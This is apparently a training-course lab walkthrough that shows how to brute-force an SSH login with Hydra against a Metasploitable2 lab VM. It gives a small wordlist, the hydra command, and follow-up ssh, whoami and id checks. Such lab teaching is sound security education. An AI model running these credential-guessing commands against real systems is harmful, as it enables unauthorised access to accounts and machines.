Module 4 › Chapter 3.5 › Hydra Lab Walkthrough
Step-by-step
  1. Create a small passwords.txt with targeted entries.
  2. Run hydra with -l for username and -P for passwords against ssh://IP.
  3. When hydra reports a match, attempt an ssh login to verify the shell.
  4. Run whoami, id, and pwd to inspect context and privileges.
Always restrict this to lab VMs like Metasploitable2 and avoid production targets.
Commands used
echo "password" > passwords.txt
echo "123456" >> passwords.txt
echo "msfadmin" >> passwords.txt
hydra -l msfadmin -P passwords.txt ssh://192.168.1.105

# After success:
ssh msfadmin@192.168.1.105
whoami
id
pwd
The command sequence shows preparation, attack, and verification steps you should follow and document.
Key Takeaway

Verification matters: always confirm tool output by performing an actual login and capturing the command context.
